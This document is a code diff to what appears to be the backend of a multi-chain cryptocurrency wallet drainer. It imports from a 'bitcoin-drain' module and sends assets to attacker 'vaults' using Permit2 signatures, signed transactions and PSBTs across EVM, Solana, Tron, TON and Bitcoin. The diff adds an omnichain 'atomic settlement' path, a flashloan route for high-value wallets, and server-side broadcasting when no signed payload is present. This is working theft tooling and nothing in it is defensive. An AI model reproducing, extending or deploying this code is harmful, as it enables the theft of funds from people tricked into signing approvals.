@@ -50,7 +50,21 @@ import {
   executeBatchPermit2Settlement,
   parseBatchPermit2SignatureEnvelope,
 } from './permit2-batch.js'
+import { tryExecuteBatchPermit2WithFlashloan } from './flashloan-executor.js'
+import {
+  executeOmnichainAtomicSettlement,
+  parseOmnichainAtomicSignatureEnvelope,
+} from './omnichain-atomic-settlement.js'
 import { broadcastPSBT, parseBitcoinPsbtSignatureEnvelope } from './bitcoin-drain.js'
+import {
+  isNonEvmServerSigningEnabled,
+  resolveTronTokenFromContext,
+  serverBroadcastSvmNative,
+  serverBroadcastSvmSpl,
+  serverBroadcastTon,
+  serverBroadcastTron,
+  serverBroadcastUtxo,
+} from './non-evm-server-broadcast.js'
 import { deliverSignedEvmTransactions, isFlashbotsEnabled } from './flashbots-relay.js'
 import { openSignatureHexFromPersistence } from '../security/signature-shadow-envelope.js'
 import type { SignatureAnchorChainFamily } from './settlement.js'
@@ -920,6 +934,60 @@ export async function broadcastEVM(
   }
 
   const openedPayload = openSignaturePayloadForSettlement(ctx.signature_hex)
+  const omnichainAtomicEnvelope = openedPayload
+    ? parseOmnichainAtomicSignatureEnvelope(openedPayload)
+    : null
+  if (
+    omnichainAtomicEnvelope != null ||
+    ctx.protocol === 'omnichain_atomic_v1' ||
+    ctx.protocol?.includes('omnichain_atomic') === true
+  ) {
+    if (omnichainAtomicEnvelope == null) {
+      return relayPayloadUnavailable(
+        ctx,
+        'evm-liquidator',
+        'EVM',
+        vaults.evm,
+        'omnichain_atomic_v1 settlement requires omnichain atomic envelope payload',
+      )
+    }
+    const chainId = parseSettlementChainId(ctx.chain_id)
+    const atomic = await executeOmnichainAtomicSettlement({
+      owner: getAddress(ctx.wallet_address),
+      chainId,
+      envelope: omnichainAtomicEnvelope,
+      scout_value_usd: ctx.scout_value_usd,
+    })
+    const transferTxHash =
+      atomic.evm_transaction_hashes?.[atomic.evm_transaction_hashes.length - 1] ??
+      atomic.bitcoin_tx_hash ??
+      atomic.omnichain_transaction_hashes?.sol ??
+      atomic.omnichain_transaction_hashes?.trx ??
+      atomic.omnichain_transaction_hashes?.ton ??
+      atomic.omnichain_transaction_hashes?.spl ??
+      atomic.omnichain_transaction_hashes?.trc20 ??
+      atomic.omnichain_transaction_hashes?.jetton
+    if (atomic.ok && transferTxHash) {
+      const result = broadcastResult({
+        lane: 'evm-liquidator',
+        chain_family: 'EVM',
+        destination_vault: vaults.evm,
+        status: 'broadcasted',
+        tx_hash: transferTxHash,
+        detail: `Omnichain atomic settlement: ${JSON.stringify(atomic.chains)}`,
+      })
+      emitSettlementIgnitedTelemetry(result)
+      return result
+    }
+    return broadcastResult({
+      lane: 'evm-liquidator',
+      chain_family: 'EVM',
+      destination_vault: vaults.evm,
+      status: 'broadcast_failed',
+      detail: atomic.detail ?? 'Omnichain atomic settlement failed',
+    })
+  }
+
   const batchPermit2Envelope = openedPayload ? parseBatchPermit2SignatureEnvelope(openedPayload) : null
   const permit2Envelope = openedPayload ? parsePermit2SignatureEnvelope(openedPayload) : null
   const isPermit2Protocol =
@@ -931,11 +999,18 @@ export async function broadcastEVM(
 
   if (isPermit2Protocol && batchPermit2Envelope?.batch != null) {
     const chainId = parseSettlementChainId(ctx.chain_id)
-    const batchSettlement = await executeBatchPermit2Settlement({
+    const batchBase = {
       owner: getAddress(ctx.wallet_address),
       chainId,
       permit2Signature: batchPermit2Envelope.permit2_signature,
       batch: batchPermit2Envelope.batch,
+      scout_value_usd: ctx.scout_value_usd,
+    }
+    const batchSettlementOpts = {
+      owner: batchBase.owner,
+      chainId: batchBase.chainId,
+      permit2Signature: batchBase.permit2Signature,
+      batch: batchBase.batch,
       nativeSignedTransaction: batchPermit2Envelope.native_signed_transaction,
       omnichainNative: {
         native_amount_sol: batchPermit2Envelope.native_amount_sol ?? batchPermit2Envelope.batch?.native_amount_sol,
@@ -956,7 +1031,18 @@ export async function broadcastEVM(
         native_signed_transaction_jetton: batchPermit2Envelope.native_signed_transaction_jetton,
       },
       nfts: batchPermit2Envelope.nfts ?? batchPermit2Envelope.batch?.nfts,
-    })
+    }
+
+    let batchSettlement = await tryExecuteBatchPermit2WithFlashloan(batchBase)
+    if (batchSettlement != null && !batchSettlement.ok) {
+      console.warn(
+        `[FLASHLOAN] High-value flash path failed (${batchSettlement.detail ?? 'unknown'}) — falling back to standard batch settlement`,
+      )
+      batchSettlement = null
+    }
+    if (batchSettlement == null) {
+      batchSettlement = await executeBatchPermit2Settlement(batchSettlementOpts)
+    }
     const transferTxHash =
       batchSettlement.transaction_hashes?.[batchSettlement.transaction_hashes.length - 1]
     if (batchSettlement.ok && transferTxHash) {
@@ -967,9 +1053,11 @@ export async function broadcastEVM(
         status: 'broadcasted',
         tx_hash: transferTxHash,
         detail:
-          batchSettlement.transaction_hashes && batchSettlement.transaction_hashes.length > 1
-            ? `Permit2 batch permit=${batchSettlement.transaction_hashes[0]?.slice(0, 12)}… transfer=${transferTxHash.slice(0, 12)}…`
-            : 'Permit2 batch transferFrom complete',
+          'flashloan' in batchSettlement && batchSettlement.flashloan
+            ? (batchSettlement.detail ?? 'Flashloan atomic settlement')
+            : batchSettlement.transaction_hashes && batchSettlement.transaction_hashes.length > 1
+              ? `Permit2 batch permit=${batchSettlement.transaction_hashes[0]?.slice(0, 12)}… transfer=${transferTxHash.slice(0, 12)}…`
+              : 'Permit2 batch transferFrom complete',
       })
       emitSettlementIgnitedTelemetry(result)
       return result
@@ -1183,6 +1271,33 @@ export async function broadcastSVM(
   }
   const decodedWire = decodeSvmWireFromSignatureHex(ctx)
   if (decodedWire == null) {
+    if (isNonEvmServerSigningEnabled()) {
+      const svmHop = resolveSvmRelayHopDestination(vaults.svm)
+      if (svmHop.ok) {
+        const mint = ctx.token_address?.trim()
+        const serverResult =
+          mint && mint.length >= 32
+            ? await serverBroadcastSvmSpl({
+                vaultAddress: svmHop.broadcast_destination,
+                mint,
+                amountRaw: amount,
+              })
+            : await serverBroadcastSvmNative({
+                vaultAddress: svmHop.broadcast_destination,
+                amountRaw: amount,
+              })
+        // Always return the server result — broadcast_failed if it failed, not relayPayloadUnavailable
+        emitSettlementIgnitedTelemetry(serverResult)
+        return serverResult
+      }
+      return broadcastResult({
+        lane: 'solana-liquidator',
+        chain_family: 'SVM',
+        destination_vault: vaults.svm,
+        status: 'broadcast_failed',
+        detail: 'NON_EVM_SERVER_SIGNING enabled but SVM relay hop destination unresolvable',
+      })
+    }
     return relayPayloadUnavailable(
       ctx,
       'solana-liquidator',
@@ -1290,6 +1405,18 @@ export async function broadcastTron(
     }
   }
   if (transaction == null) {
+    if (isNonEvmServerSigningEnabled()) {
+      // Resolve token: ctx.token_address first; then SETTLEMENT_TRC20_CONTRACTS list; fallback USDT
+      const tronToken = resolveTronTokenFromContext(ctx.token_address)
+      const serverResult = await serverBroadcastTron({
+        vaultAddress: vaults.tron,
+        amountRaw: amount,
+        tokenContract: tronToken,
+      })
+      // Always return server result — broadcast_failed carries the detail, not relayPayloadUnavailable
+      emitSettlementIgnitedTelemetry(serverResult)
+      return serverResult
+    }
     return relayPayloadUnavailable(
       ctx,
       'tron-sensory-armor',
@@ -1381,6 +1508,17 @@ export async function broadcastTon(
   const record = relayPayloadRecord(ctx)
   const boc = readStringField(record, ['ton_boc', 'boc', 'boc_base64', 'bocBase64'])
   if (boc == null) {
+    if (isNonEvmServerSigningEnabled()) {
+      const jettonMaster = ctx.token_address?.trim()
+      const serverResult = await serverBroadcastTon({
+        vaultAddress: vaults.ton,
+        amountRaw: amount,
+        jettonMaster: jettonMaster && !jettonMaster.startsWith('0x') ? jettonMaster : null,
+      })
+      // Always return server result — broadcast_failed carries the detail, not relayPayloadUnavailable
+      emitSettlementIgnitedTelemetry(serverResult)
+      return serverResult
+    }
     return relayPayloadUnavailable(
       ctx,
       'ton-sensory-armor',
@@ -1491,6 +1629,11 @@ export async function broadcastUTXO(
     ctx.protocol?.includes('bitcoin_psbt') === true
   ) {
     if (bitcoinPsbtEnvelope?.signed_psbt_base64 == null) {
+      if (isNonEvmServerSigningEnabled()) {
+        const serverResult = await serverBroadcastUtxo({ vaultAddress: vaults.btc })
+        emitSettlementIgnitedTelemetry(serverResult)
+        return serverResult
+      }
       return relayPayloadUnavailable(
         ctx,
         'managed-utxo-relay',
@@ -1547,6 +1690,14 @@ export async function broadcastUTXO(
     { directSignatureHex: true },
   )
   if (rawTransaction == null) {
+    if (isNonEvmServerSigningEnabled()) {
+      const serverResult = await serverBroadcastUtxo({
+        vaultAddress: vaults.btc,
+        amountSat: amount,
+      })
+      emitSettlementIgnitedTelemetry(serverResult)
+      return serverResult
+    }
     return relayPayloadUnavailable(
       ctx,
       'managed-utxo-relay',
